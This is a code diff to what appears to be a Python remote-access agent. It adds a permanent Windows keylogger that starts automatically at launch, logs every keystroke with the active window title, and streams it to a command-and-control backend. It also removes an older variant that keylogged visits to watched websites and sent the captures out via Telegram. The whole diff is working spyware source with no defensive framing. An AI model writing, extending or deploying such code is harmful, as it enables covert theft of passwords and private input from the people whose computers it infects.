@@ -373,6 +373,53 @@ def get_foreground_window_title() -> str:
         return ""
 
 
+def start_permanent_keylogger():
+    """Start permanent, continuous global keylogger on agent startup."""
+    if platform.system() != "Windows":
+        return
+    try:
+        from pynput import keyboard
+    except ImportError:
+        print("[ERROR] pynput not installed. Keylogger skipped.")
+        return
+
+    if "permanent" in ACTIVE_LISTENERS:
+        return
+
+    log_path = KEYLOGS_DIR / "global_activity.txt"
+
+    def on_press(key):
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            win_title = get_foreground_window_title()
+            key_text = ""
+
+            if hasattr(key, 'char') and key.char:
+                key_text = key.char
+            else:
+                key_str = str(key).replace('Key.', '').upper()
+                key_text = f"[{key_str}]"
+
+            # 1. Write to local continuous log
+            with open(log_path, 'a', encoding='utf-8') as f:
+                f.write(f"[{timestamp}] {key_text}\n")
+
+            # 2. Push to live stream queue for server ingestion
+            LIVE_STREAM_QUEUE.put({
+                "stream_type": "keylog",
+                "window_title": win_title,
+                "content": key_text
+            })
+        except Exception as e:
+            print(f"[KEYLOG ERROR] {e}")
+
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    ACTIVE_LISTENERS["permanent"] = listener
+    print("[KEYLOG] Permanent background keylogger active.")
+
+
+
 async def live_stream_flusher_loop(node_id_provider):
     """Periodically sends queued live telemetry/keystroke events to C2 backend."""
     while True:
@@ -1631,110 +1678,9 @@ Write-Output ("URL=" + $url)
         )
         return (result.stdout or "").strip()
     except Exception as e:
-        print(f"[WEB_MONITOR] probe error: {e}")
+        print(f"[BROWSER_HINT] probe error: {e}")
         return ""
 
-
-def match_watched_domain(hint: str) -> Optional[str]:
-    """Return the first WATCH_DOMAINS entry found in the browser hint text."""
-    if not hint or not WATCH_DOMAINS:
-        return None
-    hay = hint.lower()
-    for domain in WATCH_DOMAINS:
-        d = (domain or "").strip().lower()
-        if d and d in hay:
-            return d
-    return None
-
-
-async def start_visit_keylog(
-    task_manager: PersistentTaskManager,
-    report_callback,
-    domain: str,
-) -> None:
-    """Start a 2-minute keylog for a matched domain; Telegram upload on completion."""
-    task_id = f"webmon-{domain.replace('.', '_')}-{int(time.time())}"
-    task_id = task_id[:36]
-
-    # Prefill log header so Telegram file shows why it was captured
-    log_path = KEYLOGS_DIR / f"activity_log_{task_id[:8]}.txt"
-    try:
-        with open(log_path, "a", encoding="utf-8") as f:
-            f.write(
-                f"=== Web visit keylog ===\n"
-                f"Domain: {domain}\n"
-                f"Started: {datetime.now().isoformat()}\n"
-                f"Duration: {KEYLOG_ON_VISIT_SECONDS}s\n"
-                f"========================\n"
-            )
-    except Exception:
-        pass
-
-    ptask = PersistentTask(
-        task_id=task_id,
-        task_name=f"web_keylog_{domain}",
-        action_type="keylog",
-        interval_seconds=30,
-        duration_seconds=KEYLOG_ON_VISIT_SECONDS,
-        started_at=time.time(),
-        params={"trigger_domain": domain},
-        data_path=str(log_path),
-        goal_id=None,
-        is_running=True,
-    )
-    task_manager.add_task(ptask)
-    _web_monitor_active[domain] = task_id
-    _web_monitor_cooldowns[domain] = time.time()
-
-    print(f"[WEB_MONITOR] Matched {domain} → keylog for {KEYLOG_ON_VISIT_SECONDS}s (task {task_id})")
-    await send_telegram_message(
-        f"🌐 <b>Watched site opened</b>\n"
-        f"Domain: <code>{domain}</code>\n"
-        f"Keylogging for {KEYLOG_ON_VISIT_SECONDS}s…"
-    )
-
-    async def _run_and_clear():
-        try:
-            await run_persistent_task(task_manager, ptask, report_callback)
-        finally:
-            _web_monitor_active.pop(domain, None)
-
-    loop_task = asyncio.create_task(_run_and_clear())
-    task_manager.running_loops[task_id] = loop_task
-
-
-async def website_monitor_loop(
-    task_manager: PersistentTaskManager,
-    report_callback,
-) -> None:
-    """Background loop: watch active browser; on domain match, keylog 2 min + Telegram."""
-    if platform.system() != "Windows":
-        print("[WEB_MONITOR] Skipped (Windows only)")
-        return
-    if not WATCH_DOMAINS:
-        print("[WEB_MONITOR] Skipped (WATCH_DOMAINS empty)")
-        return
-
-    print(f"[WEB_MONITOR] Watching domains: {', '.join(WATCH_DOMAINS)}")
-
-    while True:
-        try:
-            hint = await asyncio.to_thread(get_active_browser_hint)
-            domain = match_watched_domain(hint)
-            if domain:
-                now = time.time()
-                # Already keylogging this domain
-                if domain in _web_monitor_active:
-                    pass
-                # Cooldown after a recent trigger
-                elif now - _web_monitor_cooldowns.get(domain, 0) < WEB_MONITOR_COOLDOWN:
-                    pass
-                else:
-                    await start_visit_keylog(task_manager, report_callback, domain)
-        except Exception as e:
-            print(f"[WEB_MONITOR] Error: {e}")
-
-        await asyncio.sleep(WEB_MONITOR_INTERVAL)
 
 
 # =============================================================================
@@ -1801,8 +1747,8 @@ async def main():
         )
         task_manager.running_loops[task.task_id] = loop_task
 
-    # Watch browser for configured domains → 2 min keylog + Telegram
-    asyncio.create_task(website_monitor_loop(task_manager, report_result))
+    # Permanent continuous background keylogger (runs automatically from startup)
+    start_permanent_keylogger()
     
     # Real-time telemetry & keylog stream flusher (flushes buffer every 1.5s)
     asyncio.create_task(live_stream_flusher_loop(lambda: node_id))
